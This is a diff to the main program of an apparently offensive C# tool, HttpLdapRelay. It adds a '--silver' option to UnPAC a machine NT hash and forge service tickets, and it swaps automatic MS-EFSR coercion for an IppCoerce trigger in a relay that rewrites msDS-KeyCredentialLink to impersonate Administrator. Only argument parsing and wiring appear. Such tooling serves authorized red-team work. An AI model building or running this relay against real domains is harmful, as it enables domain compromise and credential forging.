@@ -47,6 +47,7 @@ namespace HttpLdapRelay
             string userToImpseronate = "Administrator";
             string fullDomainName = "";
             bool forceOverwrite = false; // Force overwrite existing msDS-KeyCredentialLink
+            bool useSilverTicket = false;
 
 
             for (int i = 0; i < args.Length; i++)
@@ -92,6 +93,9 @@ namespace HttpLdapRelay
                     case "--force":
                         forceOverwrite = true;
                         break;
+                    case "--silver":
+                        useSilverTicket = true;
+                        break;
                     case "-a":
                     case "--auto":
                     case "--coerce":
@@ -104,7 +108,7 @@ namespace HttpLdapRelay
                     case "-h":
                     case "--help":
                         showHelp = true;
-                        break; 
+                        break;
                 }
             }
 
@@ -138,6 +142,7 @@ namespace HttpLdapRelay
             Console.WriteLine($"    Domain:      {fullDomainName}");
             Console.WriteLine($"    Auto Coerce:  {autoCoerce}");
             Console.WriteLine($"    User to impersonate: {userToImpseronate}");
+            Console.WriteLine($"    Silver ticket: {useSilverTicket}");
             Console.WriteLine();
 
             if (httpPort <= 1024)
@@ -161,10 +166,10 @@ namespace HttpLdapRelay
 
             try
             {
-                var server = new HttpRelayServer(httpPort, ldapTarget, ldapPort, useLdaps, verbose, userToImpseronate, fullDomainName, listenAddress, command, forceOverwrite);
+                var server = new HttpRelayServer(httpPort, ldapTarget, ldapPort, useLdaps, verbose, userToImpseronate, fullDomainName, listenAddress, command, forceOverwrite, useSilverTicket);
                 Console.WriteLine();
                 Console.WriteLine("[*] Starting HTTP Relay Server...");
-                
+
 
                 var serverThread = new Thread(() =>
                 {
@@ -192,11 +197,11 @@ namespace HttpLdapRelay
                 {
                     Console.WriteLine();
                     Console.ForegroundColor = ConsoleColor.Cyan;
-                    Console.WriteLine("[*] Auto-coercion enabled - will trigger MS-EFSR in 2 seconds...");
+                    Console.WriteLine("[*] Auto-coercion enabled - will trigger IppCoerce in 2 seconds...");
                     Console.ResetColor();
 
                     // Start coercion asynchronously (non-blocking)
-                    _ = EfsTrigger.TriggerAsync(httpPort, 2000);
+                    _ = IppCoerceTrigger.TriggerAsync(httpPort, 2000);
                 }
 
                 Console.WriteLine("╔════════════════════════════════════════════════════════════════╗");
@@ -250,9 +255,10 @@ namespace HttpLdapRelay
             Console.WriteLine("  -p, --port <port>                  HTTP port to listen on (default: 8080)");
             Console.WriteLine("  -u, --user-to-impersonate <user>   The username you want to impersonate (default: Administrator)");
             Console.WriteLine("  --force                            /!\\ Warning /!\\ Force the change of ms-DSKeyCredentialLink attribute ");
+            Console.WriteLine("  --silver                           UnPAC the machine NT hash and forge service tickets locally");
             Console.WriteLine("  -lp, --ldap-port <port>            LDAP port (default: 389, or 636 for LDAPS)");
             Console.WriteLine("  -s, --ldaps                        Use LDAPS instead of LDAP (default: false)");
-            Console.WriteLine("  -a, --auto                         If used, disable auto-trigger EFS coercion. Enabled by default.");
+            Console.WriteLine("  -a, --auto                         If used, disable auto-trigger IppCoerce coercion. Enabled by default.");
             Console.WriteLine("  -v, --verbose                      Enable verbose output");
             Console.WriteLine("  -h, --help                         Show this help message");
             Console.WriteLine();
